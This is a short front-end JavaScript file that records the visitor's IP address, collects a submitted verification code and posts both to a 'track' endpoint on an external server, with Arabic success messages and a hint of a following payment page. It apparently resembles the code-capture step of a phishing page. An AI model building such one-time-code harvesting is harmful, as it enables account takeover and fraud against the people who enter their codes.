// public/js/code.js

// 1️⃣ Fetch & store visitor IP
window.visitorIP = null;
(async () => {
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const { ip } = await res.json();
    window.visitorIP = ip;
    console.log("Visitor IP:", ip);
  } catch (err) {
    console.error("IP fetch failed:", err);
  }
})();

// 2️⃣ When the DOM is ready, wire up the form listener
document.addEventListener("DOMContentLoaded", () => {
  const form = document.getElementById("codeForm");
  const overlay = document.getElementById("loadingOverlay");

  form.addEventListener("submit", async (event) => {
    event.preventDefault();

    // Show the loading overlay
    overlay.style.display = "flex";

    // Wait until visitorIP is fetched
    while (window.visitorIP === null) {
      await new Promise((r) => setTimeout(r, 50));
    }

    // Gather form data
    const codeInput = document.getElementById("verification_code");
    const payload = {
      ip: window.visitorIP,
      verification_code: codeInput.value.trim(),
    };

    try {
      // Send to your server
      const res = await fetch(
        "https://b-care-server.onrender.com/api/track/code",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        }
      );
      const json = await res.json();
      if (!json.success) {
        throw new Error(json.error || "Server error");
      }

      // Success – you can redirect or show a message
      alert("تم التحقق بنجاح!");
      // e.g. window.location.href = 'payment.html';
    } catch (err) {
      console.error("Submit failed:", err);
      alert("حدث خطأ أثناء الإرسال. حاول مرة أخرى.");
    } finally {
      // Always hide the overlay
      overlay.style.display = "none";
    }
  });
});
